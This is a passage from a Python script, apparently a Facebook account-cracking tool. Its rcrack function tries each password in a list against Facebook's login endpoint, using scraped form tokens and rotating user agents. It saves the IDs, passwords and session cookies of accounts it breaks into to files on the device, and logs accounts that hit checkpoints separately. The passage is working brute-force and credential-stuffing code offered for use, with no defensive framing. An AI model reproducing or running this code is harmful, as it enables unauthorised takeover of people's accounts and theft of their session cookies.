				print('\r\r\x1b[38;6;200m [Checkpoint] '+ids+' | '+pas+'\033[1;97m')
				open('/sdcard/N0M1-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(10)
	except Exception as e:
		pass
def rcrack(ids,passlist):
	global loop
	global oks
	try:
		for pas in passlist:
			sys.stdout.write('\r\r\033[1;32m [PRO-CHARISE] %s|\033[1;32mOK:-%s \033[1;91m'%(loop,len(oks)));sys.stdout.flush()
			session = requests.Session()
			pro = random.choice(ugen)
			free_fb = session.get('https://free.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":ids,
			"pass":pas,
			"login":"Log In"}
			header_freefb = {'authority':'web.facebook.com',
			'method': 'POST',
			'scheme': 'https',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9',
			'cache-control': 'max-age=0',
			'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"macOS"',
			'sec-fetch-dest': 'document',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-site': 'none',
			'sec-fetch-user': '?1',
			'upgrade-insecure-requests': '1',
			'user-agent': pro}
			lo = session.post('https://web.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				uid = coki[7:22]
				if uid in oks:pass
				else:
					if 'checkpoint' in str(lo):
						print('\r\r\033[1;34m [PRO-TL] '+ids+' | '+pas)
					else:
						print(f'\r\x1b[1;32m [Successful] '+ids+' | '+pas)
						cek_apk(session,coki)
						open('/sdcard/N0M1-OK.txt', 'a').write(ids+'|'+pas+'|'+coki+'\n')
						oks.append(uid)
						break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				uid = coki[24:39]
				if uid in cps:pass
				else:
					print('\r\r\x1b[38;5;208m [Checkpoint] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/N0M1-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(10)
	except:
		pass

try:
	menu()
except requests.exceptions.ConnectionError:
	print('\n No internet connection ...')
	exit()
except:exit()"))